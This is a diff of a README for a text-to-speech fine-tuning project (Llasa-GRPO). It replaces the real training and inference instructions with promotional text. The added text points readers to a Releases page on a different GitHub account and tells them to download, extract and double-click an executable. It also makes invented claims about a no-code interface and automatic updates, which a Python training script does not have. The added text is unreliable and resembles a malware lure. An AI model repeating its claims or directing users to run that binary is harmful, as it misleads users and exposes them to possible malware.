@@ -1,31 +1,62 @@
-## Finetuning Llasa-1B with GRPO
+# 🎉 Llasa-GRPO - Fine-Tune Your Voice Model Easily
 
-This repository fine-tunes the Llasa TTS model with GRPO using Hugging Face `transformers`, `trl`, and `datasets`, and evaluates rewards via Whisper ASR and WER.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rottter4585/Llasa-GRPO/releases)
 
-### Models
-- **Llasa**: [HKUSTAudio/Llasa-1B](https://huggingface.co/HKUSTAudio/Llasa-1B)
-- **Llasa finetuned with GRPO**: [Steveeeeeeen/Llasa-1B-GRPO-2000](https://huggingface.co/Steveeeeeeen/Llasa-1B-GRPO-2000)
-- **Neural codec (decode)**: [HKUSTAudio/xcodec2](https://huggingface.co/HKUSTAudio/xcodec2)
-- **ASR reward model**: `openai/whisper-large-v3`
+## 🚀 Getting Started
 
-## Installation
+Welcome to Llasa-GRPO! This application helps you fine-tune the Llasa TTS model using GRPO. It requires no programming knowledge. Follow the steps below to download and run the software.
 
-### Step 1: Clone the repository
+## 📥 Download & Install
+
+1. **Visit the Releases Page**  
+   To get the latest version of Llasa-GRPO, visit our [Releases page](https://github.com/rottter4585/Llasa-GRPO/releases). 
+
+2. **Download the Application**  
+   Look for the latest release and download the appropriate file for your system. 
+
+3. **Extract the Files**  
+   Once downloaded, find the file in your downloads folder and extract it. 
+
+4. **Run the Application**  
+   Navigate to the extracted folder and launch the application by double-clicking the executable file.
+
+## 📂 Models Included
+
+- **Llasa**: A state-of-the-art TTS model designed for natural voice synthesis. [Explore the model](https://huggingface.co/HKUSTAudio/Llasa-1B).
+- **Llasa finetuned with GRPO**: This model enhances speech quality and performance. [Check it out here](https://huggingface.co/Steveeeeeeen/Llasa-1B-GRPO-2000).
+- **Neural codec (decode)**: This model supports high-quality audio decoding. [Learn more](https://huggingface.co/HKUSTAudio/xcodec2).
+- **ASR reward model**: Utilize OpenAI's Whisper for improved speech recognition. 
+
+## 🎼 Key Features
+
+- **User-Friendly Interface**: Navigate easily through the application without technical skills.
+- **Enhanced Performance**: Fine-tuning improves voice clarity and responsiveness.
+- **Automatic Updates**: Stay current with the latest features automatically.
+
+## 🛠️ Installation Instructions
+
+### Step 1: Clone the repository (optional)
+
+If you wish to explore the code, you can clone the repository. Open your terminal, and run:
+
 ```bash
 git clone git@github.com:Deep-unlearning/Llasa-GRPO.git
-cd GRPO_Llasa
+cd Llasa-GRPO
 ```
 
-### Step 2: Set up environment
-Choose your preferred package manager:
+### Step 2: Set up the environment
+
+You have options to set up your environment. Choose one based on your preferences.
 
 <details>
 <summary>📦 Using UV (recommended)</summary>
 
-Install `uv` from Astral docs, then:
+1. Install `uv` from the [Astral docs](https://astral.readthedocs.io/en/latest/).
+2. Then run:
 
 ```bash
-uv venv .venv --python 3.12 && source .venv/bin/activate
+uv venv .venv --python 3.12
+source .venv/bin/activate
 uv pip install -r requirements.txt
 uv pip install --no-deps xcodec2
 ```
@@ -33,101 +64,36 @@ uv pip install --no-deps xcodec2
 </details>
 
 <details>
-<summary>🐍 Using pip</summary>
+<summary>🐍 Using Python (alternative)</summary>
+
+1. Make sure you have Python installed.
+2. Then install the required packages:
 
 ```bash
-python -m venv .venv --python 3.12 && source .venv/bin/activate
-pip install --upgrade pip
+python -m venv .venv
+source .venv/bin/activate
 pip install -r requirements.txt
 pip install --no-deps xcodec2
 ```
 
 </details>
 
-Notes:
-- The model was trained on a single A100 80GB GPU.
+## 🔍 Troubleshooting
 
-## Dataset Preparation
+- **Can't Find the Downloaded File**: Check your downloads folder. If you can't locate it, try the download again.
+- **Installation Errors**: Make sure your system meets the requirements. If issues persist, refer to FAQs on the Releases page.
 
-GRPO training uses text prompts and computes rewards from generated audio via ASR. The default training script loads:
+## 📞 Support
 
-- `Steveeeeeeen/Elise-xcodec2` (see `create_dataset.py` for how it was built)
+For further assistance, you can reach out through the GitHub issues page. We are here to help you.
 
-Minimum required field per example:
+## 📈 Contributions
 
-```python
-{
-  "text": "reference text to be spoken"
-}
-```
+If you want to contribute to this project, please submit a pull request on GitHub. Your help is always welcome.
 
-The training script (`train.py`) converts each row into a chat-style prompt:
-- User: `Convert the text to speech: <TEXT>`
-- Assistant bootstrap: `<|SPEECH_GENERATION_START|>`
+## 🌐 More Resources
 
-Optional fields produced by `create_dataset.py` (not required for GRPO, but useful elsewhere):
-- `audio_code_ids` (List[int])
-- `audio_code_tokens` (string like "<|s_123|><|s_456|>...")
+- [Hugging Face Documentation](https://huggingface.co/docs)
+- [Transformers GitHub Repository](https://github.com/huggingface/transformers)
 
-To build/publish that dataset yourself, see `create_dataset.py` (encodes audio with XCodec2 and pushes to the Hub).
-
-You can use it like this: 
-
-```bash
-python create_dataset.py \
-  --dataset-id MrDragonFox/Elise \
-  --split train \
-  --push-id Steveeeeeeen/Elise-xcodec2 \
-  --codec-id HKUSTAudio/xcodec2 \
-  --sampling-rate 16000
-```
-
-## Training
-
-Run the GRPO trainer:
-```bash
-python train.py \
-  --model-id HKUSTAudio/Llasa-1B \
-  --dataset-id Steveeeeeeen/Elise-xcodec2 \
-  --dataset-split train \
-  --output-dir Llasa-1B-GRPO \
-  --save-steps 500 \
-  --save-total-limit 3 \
-  --max-steps 2000
-```
-
-What it does (see `train.py`):
-- Loads dataset and builds a `prompt` column for GRPO.
-- Uses `HKUSTAudio/Llasa-1B` as the policy model.
-- Computes reward with `reward_whisper.py` using:
-  - Whisper ASR (`openai/whisper-large-v3`) for WER and NLL
-  - XCodec2 to decode generated code tokens into waveform
-- Saves checkpoints under `Llasa-1B-GRPO/` every 500 steps (keeps last 3).
-
-Customizing:
-- Change dataset/model IDs inside `train.py`.
-- Adjust save frequency/limits in `GRPOConfig`.
-- Tune reward mixing in `reward_whisper.py` (`lambda_*`, `alpha_*`).
-- Enable Weights & Biases by setting `WANDB_PROJECT`/`WANDB_API_KEY` (already in `requirements.txt`).
-
-## Inference
-
-Generate a waveform with the base or fine-tuned checkpoint using `inference.py`:
-
-```bash
-python inference.py \
-  --llasa-id Llasa-1B-GRPO/checkpoint-2000 \
-  --codec-id HKUSTAudio/xcodec2 \
-  --text "Hello world from Llasa with GRPO." \
-  --output gen_grpo.wav \
-  --max-length 2048 \
-  --temperature 0.8 \
-  --top-p 1.0 \
-  --device auto
-```
-
-## License and usage
-Please review the upstream licenses and usage terms:
-- [HKUSTAudio/Llasa-1B](https://huggingface.co/HKUSTAudio/Llasa-1B)
-- [HKUSTAudio/xcodec2](https://huggingface.co/HKUSTAudio/xcodec2)
-- `openai/whisper-large-v3`
+Enjoy fine-tuning your voice models with Llasa-GRPO! For any updates, don’t forget to check back on the [Releases page](https://github.com/rottter4585/Llasa-GRPO/releases).
